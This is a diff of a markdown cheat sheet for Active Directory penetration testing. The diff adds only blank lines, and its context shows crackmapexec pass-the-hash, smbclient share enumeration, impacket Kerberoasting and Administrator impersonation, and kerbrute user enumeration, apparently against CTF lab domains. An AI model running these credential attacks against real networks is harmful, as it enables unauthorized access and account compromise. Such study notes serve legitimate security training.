@@ -1,9 +1,11 @@
  #  Window Active Directory Pentesting
  # Crackmapexec
+ 
 ## With Password
 ```bash
 crackmapexec smb $ip -u '' -p '' --$Flags
 ```
+
 ## Pass the hashes
 ```
 crackmapexec smb $ip -u '' -H '' --$Flags
@@ -17,6 +19,7 @@ https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatshe
 ```
 
 # Smbclient
+
 ## Enumerate shares
 ```bash
 smbclient -L \\$ip\Share -U ''
@@ -88,6 +91,8 @@ impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
 ```
 impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS
 ```
+
+
 # Kerbrute
 ```
 kerbrute -users Username_wordlist.txt -domain vulnnet-rst.local -dc-ip $ip
